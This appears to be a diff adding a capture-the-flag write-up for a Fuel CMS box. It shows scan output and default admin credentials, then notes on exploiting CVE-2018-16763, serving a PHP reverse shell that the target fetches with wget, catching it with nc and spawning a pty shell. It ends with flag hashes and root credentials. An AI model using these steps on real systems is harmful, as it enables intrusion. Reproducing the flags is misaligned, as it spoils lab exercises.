@@ -1,0 +1,55 @@
+--Nmap--
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)
+```
+
+--GoBuster--
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.11.220
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/25 01:42:54 Starting gobuster
+===============================================================
+/index (Status: 200)
+/home (Status: 200)
+/0 (Status: 200)
+/assets (Status: 301)
+/offline (Status: 200)
+
+Fuel CMS Credentials
+username: admin
+password: admin
+```
+
+--Exploit--
+```
+CVE-2018-16763
+> modify python code
+-->replace url and remove proxy line and proxies=proxy var in r
+-->run using python2
+> use php-reverse-shell for a more interactive shell and replace ip
+> run 'python3 -m http.server 80'
+> on victim's machine using in the rde exploit, enter 'wget http://YOURIP:PORT/php-reverse-shell.php' (Note: When a problem is encountered, try renaming the php file and changing the PORT to another, e.g. port = 9001 on shell.php)
+> on anther shell run 'nc -nvlp PORT'
+-->on the same shell, run "python -c 'import pty;pty.spawn("/bin/sh")'"
+-->use the shell from here
+```
+
+--Flags--
+```
+Flag 1: 6470e394cbf6dab6a91682cc8585059b
+Location: home/www-data/flag.txt
+
+Flag 2: b9bbcb33e11b80be759c4e844862482d
+Location: /root/root.txt
+(Note: This flag needs root escalation to be found. As instructed on the default fuel cms website, database configuration can be found on fuel/application/config/database.php. Find the respective accounts credentiials there (root:mememe).)
+```
